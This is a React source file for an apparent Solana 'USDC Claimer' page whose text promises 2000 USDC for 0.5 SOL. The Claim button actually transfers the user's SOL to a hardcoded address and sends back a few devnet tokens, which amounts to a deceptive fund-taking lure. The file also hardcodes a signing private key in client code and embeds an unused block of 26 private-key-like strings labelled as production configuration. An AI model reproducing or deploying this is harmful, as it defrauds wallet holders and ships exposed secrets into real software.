/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4TuVarZjWcnC57mMH7v5J176Pi9mEF2Knen5qtnfZGwQFjZwqBoCw4R33XsGzkqsLy3tsp96wc48nFH1p6s4aN1D"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "vL26AMR8EMoDr7yTFgtEnNBokbkBci5fq3wV2Wn7ozAp1sxEvTH1a93cWaZMZDNDcT8SPugedsunVKLSpmhpNKx",
  "key1": "4BEM5uHbjiS42n5mv6LDR8xVWi2M4Pz3QZVX3a3ZrTk17wN7TpBjSGsbkc2MxiJcxnjgYtE8gBrSipmnT7HjgMs4",
  "key2": "mWoC1EFZe14N8PykgBHPyMSn7SQQkEuumvGfJEocuRuZqGnQ4oQ1ETCwWgSTqdyHmd2yTFCTpjSaEeLiCLpjudr",
  "key3": "47LrGMXo4CejurjQCcSgeXvbcb4bZWrPUvmo5QiZ9pNcaPdtDEJzSSmFWR86EVKZgfgZkoo2sBbSHxnd7S3WayN9",
  "key4": "2ZDmFAQYFLVcnpjWfkPKNEAEzWgEkFQaKu7RTKoc4T2QrpjmCDnRan4Qw8kbkUTevGpNmyr2SfWscRzaMoaRL5BA",
  "key5": "43akED7s43m4tDxyi7GBbZQRyz1o9DQKJXztn9MrSzD2XJYBdVAyoZdUxKxXwrM9B4g2VsvPAmJDizABb1YyGVue",
  "key6": "5ys6zhxC2WgJGEcP8VC1k9G7YgCrR9xvAjxmZTpppMpT5D3DsUQKrSEuNNywMdeDuvBxZL4m8A95ahC8SPkMGHsY",
  "key7": "5uXmvnBUzRWXSitbT8RnkUmc5GqJ4duTUVWE7VY969a2eApPxFQgmUxKdViVsT7Yzh89hLdvfBBEX5gtk68hLLjz",
  "key8": "qXwtp277tPeKeAYbV7UoDYfFNGpXocbU1xhYNukCizfuSwwV46MsBM8rKv5H4piMVt6fLq8f2butPYhhbiB3HyP",
  "key9": "2DcZA1pKe5Qcp1xew34u7LTApMXKVgH2qnvCP43Vi75jTqCRuq26Pu9AM5m4R9gr6P9wxduXJSkNy91HLBL9gR6d",
  "key10": "AweQJK6GreiDcph1y5pD7pQs2Pp1xn5XXLPJ4otVhy3QjYPNGa7qnvJJHUJx8BTfRg71Dov7Gj8dU7L1fiyjXex",
  "key11": "2dguYk84k6nAwWNbt5hbn9cimtyqgBRjXiYHbrDyfJZvxz6ik5fLmq4zdTyHaTfpQQU2HRdYXGZqmpPf2H4UmNVa",
  "key12": "4mqUeYHA3TVqrouaHPDvdrwNr1gAwRJuUtEZzLpRgGt8Cg5CdBWpAzEzGhfuHqHr4vLVmY251UaR6USZ8f7gomWx",
  "key13": "2b88d3UEci94KT1W1kuLEcNi3BHzXrwbPqS1hK5jYMK13C1kk5hgZshzCRBQu4DXdBJsbSMYdYeNWapPJ9Hhj15z",
  "key14": "4z7RP7QPWETM9Zp8eQ7wCDvCKZQekYfb9U58dGo3WgtcrRaKPahyeP7mkDJXpg2kasp4BLcBLo4ae4hFjDk4B4yv",
  "key15": "txdyLtKdRPUg9MXnSPnrw5Z39N5shQvFqizPt9a8cxAzKP74za13EtLWhxkUGisLLDccxN8V9zKTj9xf3DEnUfw",
  "key16": "2xL5VqCt4cribdXG48FmdDriRXZNwk3vnCwpY3woy2VFkkrcvj667eeHR8fqLSLr7dGARQwUaVNAKRzvq9hEB4NH",
  "key17": "4rZJwsM5bFrPwQm6pV1nPCitjETuoBAcCnreAVzzrPdvYA6c3xcnky7bpX2HwL3rtbjzEPWeZ8ZqS8D1tyuL7Lw5",
  "key18": "2AP7vpV9qKfRgRYXN5kpsU8zqa9jZEsTHp1nAKuoKPYJWEJV2ZYW954VHXEE1aSwE9J3igKqBL6wg1bnxeXiqjmg",
  "key19": "58yJ8wotYVwTC75zhwXgQwVZfjHwCKpMc71W6bMP5vqS2fokzWpyZwH2AxNBo2zbXT22fqADGUPVTZ2EXJUgRQZ8",
  "key20": "5nNu2tZSDVQTykZzr9a3hiDxoGwKdfainvEVaV1sLhcgQNBZkLV7XjhNrxt7U6iM7DYc5eWCrs7DCFaB5i9JnJe5",
  "key21": "3VgmgKHgaJKTTX7febtcjobUrCYyJ2KqVYhdnasBPkHFtd5rdRKZM1sULThvqsV8QD6DjMrjYCvKQgrvZR3CZZRe",
  "key22": "2hXYHYoVJLLPhVJb25154re4ocb7K7M52xMSNGDutVwGavAtqBwfCaX673WTRM3b7w1uuxcH4QeQtUzxonwv1EDj",
  "key23": "nH3CzAMFsY8FutD2QbwqoEPJrmHikKmg4AARGNjg5bGmpwKKTCZgndfYqUBQRFJVbEm2mnxiLVq9wmBQ2qo3Egc",
  "key24": "4Rb4vVMz2o1HZDKbY4FrGxYtnBvjFQVK2TWYnwQ2cERuDMFsw1Lq9BJP7xs4JS6dT9Q3FxGvnzhaACSd2EhpWYEA",
  "key25": "5mCyQGRkc3YMCwGcb77XEaNyfn5LDNPnFPSvGTEdxiYaZzcbSAJjHkS9U3T5Et8Bok5yd8pUiEWhN1DhGeUmJbc"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
